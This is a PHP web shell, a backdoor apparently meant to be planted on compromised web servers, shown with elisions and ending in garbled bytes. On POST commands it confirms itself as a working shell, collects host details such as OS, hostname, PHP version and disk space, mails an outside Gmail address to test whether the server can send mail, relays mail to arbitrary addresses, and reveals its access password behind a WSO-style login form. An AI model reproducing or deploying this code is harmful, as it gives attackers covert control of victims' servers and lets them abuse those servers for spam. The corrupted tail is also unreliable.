<?php
$▛ = md5(md5($_SERVER['PHP_SELF'] . '|www.smarttoolsshop.com/'));
if (isset($_POST['sts_checker_bot'])) 
{
    if ($_POST['sts_checker_bot'] == 'checking') 
    {
        echo 'STS.ORIGINAL.SHELL';
        exit();
    }
    elseif ($_POST['sts_checker_bot'] == 'getfullinfo') 
    {
        $unzip = '1';
        $mailer = '0';
        if (!class_exists('ZipArchive')) $unzip = '0';
        $rnd = rand();
        if(@mail('sts.010.team@gmail.com',"Email Sending Test Report ID: " . $rnd ,"WORKING!")) $mailer = '1';
        $the_os = php_uname('s');
        $the_host = php_uname('n');
        $the_machine_type = php_uname('m');
        $the_version = phpversion();
        $the_total_disk_space = formatSizeUnits(disk_total_space("/"));
        echo 'STS.VERFIED.SHELL|' . $mailer . '|' . $unzip . '|' . $the_host . '|' . $the_os . '|' . $the_machine_type . '|' . $the_version . '|' . $the_total_disk_space;
        exit();
    }
    elseif ($_POST['sts_checker_bot'] == 'getpassword') 
    {
        echo md5($_SERVER['PHP_SELF'] . '|www.smarttoolsshop.com/');
        exit();
    }
    elseif ($_POST['sts_checker_bot'] == 'emailcheck') 
    {
        if(@mail($_POST['sts_checker_bot_email'],"Email sending tester, Item post date: " . $_POST['sts_checker_bot_itemdate'] ,"Test successful. Please use this 'Item post date' as reference to find that item: " . $_POST['sts_checker_bot_itemdate'])) echo "true"; 
        else echo "false";
        exit();
    }
...
/* (С) 11.2011 oRb */
if(!empty($▛)) {
    if(isset($_REQUEST['pass']) && (md5($_REQUEST['pass']) == $▛))
...
function hardLogin() {
	...
	die("<pre align=center><form method=post>Password<br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='Login' style='border:none;background-color: #ff0000;color:#fff;cursor:pointer;'></form></pre>");
}
...
?>
<?php m�os360p;`t<9nr07`6so2u5=?so07t0
